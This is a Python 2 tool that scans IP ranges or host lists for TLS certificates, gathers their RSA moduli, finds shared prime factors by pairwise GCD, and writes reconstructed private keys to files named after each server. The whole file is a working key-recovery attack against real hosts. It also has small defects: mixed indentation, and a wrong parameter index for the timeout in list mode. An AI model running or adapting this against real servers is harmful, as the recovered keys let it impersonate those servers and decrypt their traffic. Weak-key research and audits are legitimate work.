import ssl
import socket
import OpenSSL
from Crypto.Util import asn1
import threading
import argparse
import sys
from rsatool import *

modulusList = []

class requestThread(threading.Thread):

	def __init__(self, threadID, name, counter, params):
		threading.Thread.__init__(self)
		self.threadID = threadID
		self.name = name
		self.counter = counter
		self.resultList = []
		self.params = params

	def __doIPRange(self, start, end, count, timeout):
		'''
		Configure thread to start scanning at IP=start, scan every 'count'
		addresses and not scan past 'end'.
		'''
		curIP = IP2Int(start)
		endIP = IP2Int(end)
		while curIP <= endIP:
			strIP = Int2IP(curIP)
			modulus = 0
			e = 0
			try:
				params = getModulus(strIP, timeout)
				modulus = params[0]
				e = params[1]
			except:
				curIP = curIP + count
				continue
			if modulus != 0:
				self.resultList.append((strIP, modulus, e))	
			curIP = curIP + count	

	def __doList(self, hostList, start, end, count, timeout):
		'''
		Configure thread to scan every 'count' elements of a list of hosts
		starting at 'start' index and not going past 'end' index.
		'''
		curIndex = start
		while curIndex <= end:
			modulus = 0
			e = 0
			try:
				params = getModulus(hostList[curIndex], timeout)
				modulus = params[0]
				e = params[1]
			except:
				curIndex = curIndex + count
				continue
			if modulus != 0:
				self.resultList.append((hostList[curIndex], modulus, e))
			curIndex = curIndex + count

	def run(self):
		if len(self.params) == 4:
			start = self.params[0]
			end = self.params[1]
			count = self.params[2]
			timeout = self.params[3]
			self.__doIPRange(start, end, count, timeout)
		if len(self.params) == 5:
			hostList = self.params[0]
			start = self.params[1]
			end = self.params[2]
			count = self.params[3]
			timeout = self.params[3]
			self.__doList(hostList, start, end, count, timeout)
		modulusList.extend(self.resultList)

def getModulus(address, timeout):
	'''
	Gets SSL cert from 'address' and returns (n, e) as tuple of long. 
	Raises exception if cert contains no RSA key. 
	'''	
	#cert = ssl.get_server_certificate((address, 443))
	cert = getcert(address, 443, timeout = timeout)
	x509 = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_ASN1, cert)
	pub = x509.get_pubkey()
	if pub.type()!=OpenSSL.crypto.TYPE_RSA:
    		raise Exception('Not RSA key')
	pub_asn1=OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_ASN1, pub)
	pub_der = asn1.DerSequence()
	pub_der.decode(pub_asn1)
	return (pub_der[1], pub_der[2])

def getcert(addr, port, timeout=None):
	sock = socket.create_connection((addr,port), timeout=timeout)
	context = ssl.create_default_context()
	context.check_hostname = False
	sslsock = context.wrap_socket(sock, server_hostname=addr)
	return sslsock.getpeercert(True)

def IP2Int(ip):
	'''
	Concert IP address to integer.
	Source: Bruno Adele, Stack Overflow
	'''
	o = map(int, ip.split('.'))
    	res = (16777216 * o[0]) + (65536 * o[1]) + (256 * o[2]) + o[3]
    	return res


def Int2IP(ipnum):
	'''
	Concert integer to IP address.
	Source: Bruno Adele, Stack Overflow
	'''
    	o1 = int(ipnum / 16777216) % 256
    	o2 = int(ipnum / 65536) % 256
    	o3 = int(ipnum / 256) % 256
    	o4 = int(ipnum) % 256
    	return '%(o1)s.%(o2)s.%(o3)s.%(o4)s' % locals()

def scanIPRange(fromIP, toIP, threads, timeout):
	'''
	Preform multi-threaded IP range scanning.
	'''
	threadArr = []
	for i in range(0, threads):
		threadIPStart = Int2IP(IP2Int(fromIP) + i) 
		thread = requestThread(i, "ip_scanner-" + str(i), i, [threadIPStart, toIP, threads, timeout])
		thread.start()
		threadArr.append(thread)
	for t in threadArr:
		t.join()


def scanList(hosts, threads, timeout):
	'''
	Preform multi-threaded host scanning.
	'''
	threadArr = []
	for i in range(0,threads):
		thread = requestThread(i, "list_scanner-" + str(i), i, [hosts, i, len(hosts)-1, threads, timeout])
		thread.start()
		threadArr.append(thread)
	for t in threadArr:
		t.join()

def loadList(fileName):
	'''
	Load lists of host from file and return list object.
	'''
	loadFile = open(fileName, 'r')
	ret = []
	for line in loadFile:
		ret.append(line.rstrip())
	return ret

def loadKeys(fileName):
	'''
	Load list of saved modulus records from previous session.
	'''
	loadFile = open(fileName, 'r')
	while True:
		host = loadFile.readline().rstrip()
		n = loadFile.readline().rstrip()
		e = loadFile.readline().rstrip()
		if not e: break
		modulusList.append((host, long(n), long(e)))

def saveKeys(fileName):
	'''
	Save list of modulus records in memory to file.
	'''
	saveFile = open(fileName, 'w')
	for record in modulusList:
		saveFile.write(str(record[0]) + '\n')
		saveFile.write(str(record[1]) + '\n')
		saveFile.write(str(record[2]) + '\n')
	saveFile.close()

def doCrack():
	'''
	Attempt to factor RSA modulus values in memory.
	'''
	for i in range(0, len(modulusList) - 1):
		record1 = modulusList[i]
		for j in range(i, len(modulusList) - 1):
			record2 = modulusList[j+1]
			ngcd = gcd(record1[1], record2[1])
			if ngcd != 1 and ngcd != record1[1] and ngcd != record2[1]:
				print "[+] Found keys for " + record1[0] + " and " + record2[0] + "."
				forgeKeys(record1, record2, ngcd)

def gcd(a, b):
	while b:
		a, b = b, a%b
	return a

def forgeKeys(record1, record2, gcd):
	'''
	Create fake private key certificates using common factor of record modulus values.
	'''
	rsa1 = RSA(p = gcd, q = record1[1]/gcd, e = record1[2])
	key1 = rsa1.to_pem()
	f = open(record1[0] + ".key", 'wb')
	f.write(key1)
	f.close()
	rsa2 = RSA(p = gcd, q = record2[1]/gcd, e = record2[2])
	key2 = rsa2.to_pem()
	f = open(record2[0] + ".key", 'wb')
	f.write(key2)
	f.close()

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('-t', action='store', dest='threads',default = 1, help='number of threads to scan with')
	parser.add_argument('-ip', dest='ipRange', default = [], nargs = '*', help = 'IP range to scan, specify with [from] [to]')
	parser.add_argument('-l', action='store', dest='listName', default = "", help='list of hosts to scan')
	parser.add_argument('-lk', action='store', dest='loadList', default = "", help='load list of saved keys from file')
	parser.add_argument('-sk', action='store', dest='saveList', default = "", help='save list of saved keys to file')
	parser.add_argument('-c', action='store_true', dest='crack', help='crack loaded RSA keys')
	parser.add_argument('-to', action='store', dest='timeout', default = "", help='timeout in seconds before terminating connections')
	args = parser.parse_args()

	# load keys
	if args.loadList != "":
		loadKeys(args.loadList)

	# scan IP ranges
	if args.ipRange != []:
		print "[+] Scanning IP range..."
		host = ""
		mask = ""
		try:
			fromIP = args.ipRange[0]
			toIP = args.ipRange[1]
			assert IP2Int(fromIP) <= IP2Int(toIP)
		except:
			print "[!] Invalid IP range."
			sys.exit(0)
		scanIPRange(fromIP, toIP, int(args.threads), int(args.timeout))

	# scan hosts in list
	if args.listName != "":
		print "[+] Scanning host list..."
		hosts = loadList(args.listName)
		scanList(hosts, int(args.threads), int(args.timeout))

	# crack RSA keys
	if args.crack:
		print "[+] Cracking keys..."
		doCrack()

	# save keys
	if args.saveList != "":
		saveKeys(args.saveList)

if __name__ == "__main__":
	main()
